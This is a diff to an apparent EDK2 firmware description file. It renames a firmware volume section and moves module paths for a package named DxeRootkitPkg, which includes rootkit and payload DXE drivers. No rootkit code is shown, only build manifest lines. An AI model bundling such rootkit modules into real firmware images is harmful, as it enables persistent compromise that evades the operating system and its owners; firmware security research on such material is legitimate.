@@ -407,7 +407,7 @@ INF  MdeModulePkg/Universal/Variable/RuntimeDxe/VariableRuntimeDxe.inf
 
 ################################################################################
 
-[FV.PAYLOADEFV]
+[FV.PAYLOADFV]
 FvForceRebase      = FALSE
 FvNameGuid         = 7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1
 BlockSize          = 0x10000
@@ -429,8 +429,8 @@ READ_LOCK_CAP      = TRUE
 READ_LOCK_STATUS   = TRUE
 
 
-INF  DxeRootkitPkg/rootkit/rootkit.inf
-INF  DxeRootkitPkg/payload/payload.inf
+INF  DxeRootkitPkg/RootkitDxe/Rootkit.inf
+INF  DxeRootkitPkg/PayloadDxe/Payload.inf
 INF  uefi-driver/uefi_driver.inf
 
 ################################################################################
